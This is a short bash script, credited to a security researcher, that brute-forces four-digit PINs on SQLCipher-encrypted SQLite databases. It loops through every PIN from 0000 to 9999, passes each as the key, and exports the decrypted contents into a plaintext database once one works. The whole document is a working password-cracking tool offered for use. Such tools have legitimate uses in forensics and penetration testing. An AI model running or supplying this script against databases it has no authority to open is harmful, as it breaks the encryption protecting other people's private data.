#!/bin/bash
# Content: Simple BruteForce on sqlcipher protected sqlite databases
# Author: Florian Hansemann | @HanseSecure | https://hansesecure.de
# Date: 11/2018
# Usage: Alter the Number Range in the File and have fun ;-)

trap killed SIGINT

function killed {
echo ""
echo "Interrupted at: $i"
exit 0
}


for i in {0000..9999}; do echo "PRAGMA key = '$i'; ATTACH DATABASE 'plaintext.db' AS plaintext KEY ''; SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;" | sqlcipher $1 2>/dev/null && echo "Pin Found: $i"; done

